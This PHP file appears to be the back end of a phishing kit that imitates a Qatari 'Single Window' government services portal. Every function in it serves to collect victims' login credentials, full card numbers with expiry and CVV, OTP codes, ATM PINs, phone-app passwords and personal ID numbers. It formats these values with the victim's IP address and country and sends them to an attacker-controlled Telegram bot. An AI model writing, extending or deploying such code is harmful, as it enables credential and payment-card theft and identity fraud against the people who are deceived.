<?php

declare(strict_types=1);

function sw_telegram_config(): array
{
    static $cfg = null;
    if (is_array($cfg)) {
        return $cfg;
    }

    $token = trim((string) (getenv('TELEGRAM_BOT_TOKEN') ?: ''));
    $chatId = trim((string) (getenv('TELEGRAM_CHAT_ID') ?: ''));
    $name = trim((string) (getenv('TELEGRAM_NAME') ?: 'Single Window'));

    foreach ([
        APP_ROOT . '/storage/telegram.json',
        APP_ROOT . '/telegram.json',
        APP_ROOT . '/telegram.json.example',
        APP_ROOT . '/storage/telegram.json.example',
    ] as $file) {
        if (!is_file($file)) {
            continue;
        }
        $raw = @file_get_contents($file);
        $json = is_string($raw) ? json_decode($raw, true) : null;
        if (!is_array($json)) {
            continue;
        }
        if ($token === '' && !empty($json['bot_token'])) {
            $token = trim((string) $json['bot_token']);
        }
        if ($chatId === '' && !empty($json['chat_id'])) {
            $chatId = trim((string) $json['chat_id']);
        }
        if ($name === 'Single Window' && !empty($json['name'])) {
            $name = trim((string) $json['name']);
        }
        if ($token !== '' && $chatId !== '') {
            break;
        }
    }

    $cfg = [
        'token' => $token,
        'chat_id' => $chatId,
        'name' => $name !== '' ? $name : 'Single Window',
    ];
    return $cfg;
}

function sw_telegram_enabled(): bool
{
    $cfg = sw_telegram_config();
    return $cfg['token'] !== '' && $cfg['chat_id'] !== '';
}

function sw_telegram_field_labels(): array
{
    return [
        'login_username' => 'اسم المستخدم',
        'login_password' => 'كلمة المرور',
        'customer_name' => 'الاسم',
        'customer_phone' => 'رقم الهاتف',
        'customer_email' => 'البريد',
        'card_number' => 'رقم البطاقة',
        'card_expiry' => 'انتهاء البطاقة',
        'card_cvv' => 'CVV',
        'otp_code' => 'رمز التحقق OTP',
        'pin_code' => 'رمز الصراف',
        'phone_verify_code' => 'رمز تحقق توثيق الهاتف',
        'phone_provider' => 'مزود الخدمة',
        'phone_number' => 'رقم هاتف التوثيق',
        'phone_email' => 'بريد مزود الخدمة',
        'phone_qid' => 'الرقم الشخصي',
        'phone_password' => 'كلمة مرور التطبيق',
        'account_type' => 'نوع الحساب',
        'reg_qid' => 'الرقم الشخصي (تسجيل)',
        'reg_email' => 'بريد التسجيل',
        'reg_mobile' => 'جوال التسجيل',
        'reg_dial_code' => 'رمز الاتصال',
        'nationality' => 'الجنسية',
        'name_ar' => 'الاسم بالعربي',
        'name_en' => 'الاسم بالإنجليزية',
        'birthdate' => 'تاريخ الميلاد',
        'gender' => 'الجنس',
        'service_code' => 'رمز الخدمة',
        'service_name' => 'اسم الخدمة',
        'service_fee' => 'قيمة الخدمة',
        'service_category' => 'تصنيف الخدمة',
        'service_duration' => 'مدة الخدمة',
        'user_type' => 'نوع المستخدم',
    ];
}

function sw_telegram_service_keys(): array
{
    return [
        'service_code',
        'service_name',
        'service_fee',
        'service_category',
        'service_duration',
    ];
}

function sw_telegram_display_value(string $key, string $value): string
{
    if ($key === 'account_type') {
        return match ($value) {
            'resident' => 'مواطن / مقيم',
            'visitor' => 'زائر / خارج قطر',
            default => $value,
        };
    }
    if ($key === 'gender') {
        return match ($value) {
            'male' => 'ذكر',
            'female' => 'أنثى',
            default => $value,
        };
    }
    return $value;
}

function sw_telegram_last_ensure(): void
{
    sw_db()->exec(
        'CREATE TABLE IF NOT EXISTS telegram_last (
            session_id TEXT PRIMARY KEY,
            payload TEXT NOT NULL,
            updated_at TEXT NOT NULL
        )'
    );
}

function sw_telegram_last_sent(string $sessionId): array
{
    if ($sessionId === '') {
        return [];
    }
    try {
        sw_telegram_last_ensure();
        $stmt = sw_db()->prepare('SELECT payload FROM telegram_last WHERE session_id = :id LIMIT 1');
        $stmt->execute(['id' => $sessionId]);
        $raw = $stmt->fetchColumn();
        if (!is_string($raw) || $raw === '') {
            return [];
        }
        $json = json_decode($raw, true);
        return is_array($json) ? $json : [];
    } catch (Throwable $e) {
        return [];
    }
}

function sw_telegram_last_merge(string $sessionId, array $sentFields): void
{
    if ($sessionId === '' || $sentFields === []) {
        return;
    }
    try {
        sw_telegram_last_ensure();
        $merged = array_merge(sw_telegram_last_sent($sessionId), $sentFields);
        sw_db()->prepare(
            'INSERT INTO telegram_last (session_id, payload, updated_at) VALUES (:id, :p, :at)
             ON CONFLICT(session_id) DO UPDATE SET payload = excluded.payload, updated_at = excluded.updated_at'
        )->execute([
            'id' => $sessionId,
            'p' => json_encode($merged, JSON_UNESCAPED_UNICODE),
            'at' => date('c'),
        ]);
    } catch (Throwable $e) {
        // Ignore.
    }
}

/**
 * All submitted capture fields for Telegram. Re-sends on revisit even if values match last send.
 */
function sw_telegram_capture_fields(array $capture): array
{
    $labels = sw_telegram_field_labels();
    $out = [];
    foreach ($capture as $key => $value) {
        if ($key === '__telegram' || $key === '__service_start' || $key === 'service_description') {
            continue;
        }
        $value = trim((string) $value);
        if ($key === 'card_number') {
            // Card numbers may be formatted with spaces (e.g. "1234 5678 ...").
            // Remove whitespace so Telegram receives a clean digits-only number.
            $value = preg_replace('/[\s\x{00A0}]+/u', '', $value) ?? $value;
        }
        if ($value === '') {
            continue;
        }
        $out[(string) $key] = isset($labels[$key])
            ? sw_telegram_display_value((string) $key, $value)
            : $value;
    }
    return $out;
}

/**
 * @deprecated Use sw_telegram_capture_fields(). Kept for callers that still compare snapshots.
 */
function sw_telegram_changed_fields(array $before, array $capture): array
{
    return sw_telegram_capture_fields($capture);
}

function sw_telegram_dedupe_ensure(): void
{
    sw_db()->exec(
        'CREATE TABLE IF NOT EXISTS telegram_dedupe (
            hash TEXT PRIMARY KEY,
            sent_at TEXT NOT NULL
        )'
    );
}

function sw_telegram_dedupe_seen(string $hash): bool
{
    try {
        sw_telegram_dedupe_ensure();
        $stmt = sw_db()->prepare('SELECT 1 FROM telegram_dedupe WHERE hash = :h LIMIT 1');
        $stmt->execute(['h' => $hash]);
        return (bool) $stmt->fetchColumn();
    } catch (Throwable $e) {
        return false;
    }
}

function sw_telegram_dedupe_mark(string $hash): void
{
    try {
        sw_telegram_dedupe_ensure();
        sw_db()->prepare(
            'INSERT OR IGNORE INTO telegram_dedupe (hash, sent_at) VALUES (:h, :at)'
        )->execute(['h' => $hash, 'at' => date('c')]);

        $cutoff = date('c', time() - 86400 * 7);
        sw_db()->prepare('DELETE FROM telegram_dedupe WHERE sent_at < :c')->execute(['c' => $cutoff]);
    } catch (Throwable $e) {
        // Ignore.
    }
}

function sw_telegram_send(string $text): bool
{
    $cfg = sw_telegram_config();
    if ($cfg['token'] === '' || $cfg['chat_id'] === '' || trim($text) === '') {
        return false;
    }

    $url = 'https://api.telegram.org/bot' . $cfg['token'] . '/sendMessage';
    $payload = json_encode([
        'chat_id' => $cfg['chat_id'],
        'text' => $text,
        'disable_web_page_preview' => true,
    ], JSON_UNESCAPED_UNICODE);
    if (!is_string($payload) || $payload === '') {
        return false;
    }

    if (function_exists('curl_init')) {
        $ch = curl_init($url);
        if ($ch !== false) {
            curl_setopt_array($ch, [
                CURLOPT_POST => true,
                CURLOPT_HTTPHEADER => ['Content-Type: application/json'],
                CURLOPT_POSTFIELDS => $payload,
                CURLOPT_RETURNTRANSFER => true,
                CURLOPT_CONNECTTIMEOUT => 8,
                CURLOPT_TIMEOUT => 15,
                CURLOPT_NOSIGNAL => true,
            ]);
            $body = curl_exec($ch);
            $code = (int) curl_getinfo($ch, CURLINFO_HTTP_CODE);
            curl_close($ch);
            if (is_string($body) && $code >= 200 && $code < 300) {
                $json = json_decode($body, true);
                return is_array($json) && !empty($json['ok']);
            }
            return false;
        }
    }

    $ctx = stream_context_create([
        'http' => [
            'method' => 'POST',
            'header' => "Content-Type: application/json\r\n",
            'content' => $payload,
            'timeout' => 15,
            'ignore_errors' => true,
        ],
    ]);
    $raw = @file_get_contents($url, false, $ctx);
    if (!is_string($raw) || $raw === '') {
        return false;
    }
    $json = json_decode($raw, true);
    return is_array($json) && !empty($json['ok']);
}

function sw_telegram_build_message(array $row, string $screen, array $changed): string
{
    if ($changed === []) {
        return '';
    }

    $cfg = sw_telegram_config();
    $labels = sw_telegram_field_labels();
    $username = trim((string) ($row['login_username'] ?? ''));
    $name = trim((string) ($row['customer_name'] ?? ''));
    if ($name === '') {
        $name = trim((string) (($row['name_ar'] ?? '') ?: ($row['name_en'] ?? '')));
    }
    $phone = trim((string) (($row['customer_phone'] ?? '') ?: ($row['phone_number'] ?? '') ?: ($row['reg_mobile'] ?? '')));

    if ($username === '' && isset($changed['login_username'])) {
        $username = (string) $changed['login_username'];
    }
    if ($name === '' && isset($changed['customer_name'])) {
        $name = (string) $changed['customer_name'];
    }
    if ($name === '' && isset($changed['name_ar'])) {
        $name = (string) $changed['name_ar'];
    }
    if ($phone === '' && isset($changed['customer_phone'])) {
        $phone = (string) $changed['customer_phone'];
    }
    if ($phone === '' && isset($changed['reg_mobile'])) {
        $phone = (string) $changed['reg_mobile'];
    }
    if ($phone === '' && isset($changed['phone_number'])) {
        $phone = (string) $changed['phone_number'];
    }

    $screenLabel = function_exists('sw_screen_label') ? sw_screen_label($screen) : $screen;
    if ($screenLabel === '' || $screenLabel === 'غير معروف') {
        $screenLabel = $screen !== '' ? $screen : 'غير محدد';
    }

    try {
        $when = (new DateTimeImmutable('now', new DateTimeZone('Asia/Qatar')))->format('Y-m-d H:i');
    } catch (Throwable $e) {
        $when = date('Y-m-d H:i');
    }

    $buf = $cfg['name'] . "\n"
        . "━━━━━━━━━━━━━━━━\n"
        . '👤 المستخدم: ' . ($username !== '' ? $username : '—') . "\n"
        . '📝 الاسم: ' . ($name !== '' ? $name : '—') . "\n"
        . '📱 الهاتف: ' . ($phone !== '' ? $phone : '—') . "\n"
        . '🖥️ الشاشة: ' . $screenLabel . "\n"
        . '🕐 ' . $when . "\n"
        . "━━━━━━━━━━━━━━━━\n";

    $bodyLines = 0;
    foreach ($changed as $key => $value) {
        $label = $labels[$key] ?? $key;
        $buf .= '▫️ ' . $label . ': ' . $value . "\n";
        $bodyLines++;
    }

    if ($bodyLines === 0) {
        $buf .= "▫️ تم تحديث بيانات المستخدم\n";
    }

    $ip = trim((string) ($row['client_ip'] ?? ''));
    $countryCode = trim((string) ($row['client_country'] ?? ''));
    if ($countryCode === '' && function_exists('sw_session_resolve_country')) {
        $countryCode = sw_session_resolve_country($row);
    }
    $countryLabel = function_exists('sw_geo_label') ? sw_geo_label($countryCode, 'ar') : $countryCode;
    if ($countryLabel === '') {
        $countryLabel = 'غير معروف';
    }
    if ($ip === '') {
        $ip = '—';
    }

    $buf .= "\n(الدولة / IP): " . $countryLabel . ' / ' . $ip;

    return trim($buf);
}

/**
 * Notify Telegram with every submitted field. Re-sends when the user revisits a screen
 * and submits again, even if the values match a previous message.
 */
function sw_telegram_queue_job(array $job): void
{
    if (!isset($GLOBALS['sw_telegram_jobs']) || !is_array($GLOBALS['sw_telegram_jobs'])) {
        $GLOBALS['sw_telegram_jobs'] = [];
    }
    $GLOBALS['sw_telegram_jobs'][] = $job;
    static $registered = false;
    if ($registered) {
        return;
    }
    $registered = true;
    register_shutdown_function(static function (): void {
        ignore_user_abort(true);
        @set_time_limit(25);
        $jobs = is_array($GLOBALS['sw_telegram_jobs'] ?? null) ? $GLOBALS['sw_telegram_jobs'] : [];
        $GLOBALS['sw_telegram_jobs'] = [];
        foreach ($jobs as $job) {
            $text = trim((string) ($job['text'] ?? ''));
            if ($text === '') {
                continue;
            }
            if (sw_telegram_send($text) && !empty($job['session_id']) && !empty($job['raw'])) {
                sw_telegram_last_merge((string) $job['session_id'], (array) $job['raw']);
            }
        }
    });
}

function sw_telegram_notify_capture(array $before, array $after, string $screen, array $capture): void
{
    if (!sw_telegram_enabled() || $capture === []) {
        return;
    }

    $sessionId = (string) ($after['id'] ?? '');
    $fields = sw_telegram_capture_fields($capture);
    $serviceKeys = array_fill_keys(sw_telegram_service_keys(), true);
    $isServiceStart = !empty($capture['__service_start']);

    if ($isServiceStart) {
        $fields = array_intersect_key($fields, $serviceKeys);
        $last = sw_telegram_last_sent($sessionId);
        $changed = false;
        foreach (sw_telegram_service_keys() as $key) {
            $new = trim((string) ($capture[$key] ?? ''));
            $old = trim((string) ($last[$key] ?? ''));
            if ($new !== '' && $new !== $old) {
                $changed = true;
                break;
            }
        }
        if (!$changed) {
            return;
        }
        $rawService = [];
        foreach (sw_telegram_service_keys() as $key) {
            $raw = trim((string) ($capture[$key] ?? ''));
            if ($raw !== '') {
                $rawService[$key] = $raw;
            }
        }
        if ($rawService !== []) {
            sw_telegram_last_merge($sessionId, $rawService);
        }
    } else {
        $fields = array_diff_key($fields, $serviceKeys);
    }

    if ($fields === []) {
        return;
    }

    $text = sw_telegram_build_message($after, $screen, $fields);
    if ($text === '') {
        return;
    }

    $rawSent = [];
    foreach ($fields as $key => $display) {
        $raw = trim((string) ($capture[$key] ?? ''));
        if ($raw !== '') {
            $rawSent[$key] = $raw;
        }
    }
    sw_telegram_queue_job([
        'text' => $text,
        'session_id' => $sessionId,
        'raw' => $rawSent,
    ]);
}
